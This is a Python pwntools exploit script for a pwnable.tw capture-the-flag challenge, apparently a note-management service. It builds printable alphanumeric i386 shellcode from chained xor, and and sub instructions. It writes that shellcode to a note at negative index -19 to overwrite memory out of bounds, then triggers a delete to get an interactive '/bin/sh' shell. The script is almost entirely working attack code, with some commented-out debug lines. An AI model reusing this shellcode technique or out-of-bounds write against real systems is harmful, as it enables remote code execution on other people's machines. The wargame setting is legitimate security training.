from pwn import *
io = remote('chall.pwnable.tw', 10201)
#io = remote('127.0.0.1', 4000)
context.arch = 'i386'

def add_note(ind, data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('Index :')
    io.sendline(str(ind))
    io.recvuntil('Name :')
    io.send(data)

def show_note(ind):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(ind))
    io.recvuntil('Name : ')
    return io.recvline()[:-1]

def del_note(ind):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(ind))

shell = asm('pop ebx')
shell += asm('pop ebx')
shell += asm('push ebx')
shell += asm('pop eax')
shell += asm('xor eax, 0x33333333')
shell += asm('xor eax, 0x3333336b')
shell += asm('push eax')
shell += asm('pop esp')
shell += asm('and eax, 0x44444444')
shell += asm('and eax, 0x33333333')
shell += asm('sub eax, 0x33337e33')
shell += asm('xor eax, 0x33333333')
shell += asm('xor eax, 0x33333233')
shell += asm('push eax')
shell += asm('sub eax, 0x66664061')
shell += asm('sub eax, 0x66664061')


#chunk_ptr = 0x804a009
print(shell)
print(hex(len(shell)))

add_note(0, '/bin/sh\n')
#add_note(1, 'b'*0x50)
#add_note(2, 'c'*0x50)
#add_note(3, 'd'*0x50)
#raw_input()
add_note(-19, shell + '\n')
#raw_input()
del_note(0)
#del_note(1)

#raw_input()
#add_note(0, 'c'*0x48)
#print(show_note(0))

io.interactive()
